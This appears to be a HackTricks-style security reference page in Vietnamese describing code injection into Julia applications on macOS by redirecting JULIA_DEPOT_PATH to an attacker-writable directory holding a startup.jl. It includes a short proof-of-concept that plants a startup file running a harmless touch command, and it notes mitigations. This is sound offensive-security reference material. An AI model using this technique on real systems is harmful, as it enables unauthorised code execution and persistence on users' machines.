# Chèn mã vào ứng dụng Julia trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` và `startup.jl`

Julia thường thực thi `config/startup.jl` từ depot đầu tiên khi khởi động. `JULIA_DEPOT_PATH` kiểm soát danh sách depot, vì vậy trỏ biến này đến một cây thư mục mà attacker có thể ghi sẽ chuyển hướng tệp startup được tự động tải.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Dấu phân cách ở cuối hữu ích khi máy nạn nhân vẫn cần các package thông thường. `julia --startup-file=no` sẽ vô hiệu hóa startup file này. Xóa biến trước khi khởi chạy vì biến này cũng kiểm soát package registry, môi trường, bộ nhớ đệm và vị trí tải code.

## References

- [1] [Giao diện dòng lệnh Julia: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Biến môi trường Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
